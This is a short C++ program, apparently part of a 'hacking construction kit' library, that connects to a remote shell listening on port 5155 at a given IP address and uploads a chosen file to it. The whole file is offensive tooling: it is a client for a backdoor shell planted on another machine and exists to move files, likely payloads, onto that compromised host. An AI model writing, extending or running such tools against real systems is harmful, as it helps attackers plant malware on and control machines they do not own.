/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include <tchar.h>

#include <upload_file_ftp.h>
#include <tcp.h>
#include <global.h>
#pragma comment(lib, "hacking construction kit.lib")

int _tmain(int argc, _TCHAR* argv[])
{
#if defined (WIN32) && defined (_DEBUG)
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF|_CRTDBG_LEAK_CHECK_DF);
#endif
	if (argc != 3){
		printf("upload a file to a remote shell on port 5155\n");
		printf("usage: %s ip filename\n", argv[0]);
		return 1;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	UploadFileFtp upload(argv[2], argv[2]);

	Tcp tcp(argv[1], 5155);
	tcp.tcpconnect();
	while (tcp.selectread()) {
		Tcp::readResponseFromSocket(tcp.m_socket);
	}
	if (tcp.selectwrite()){
		upload.upload(tcp.m_socket, argv[1]);
	}
	return 0;
}

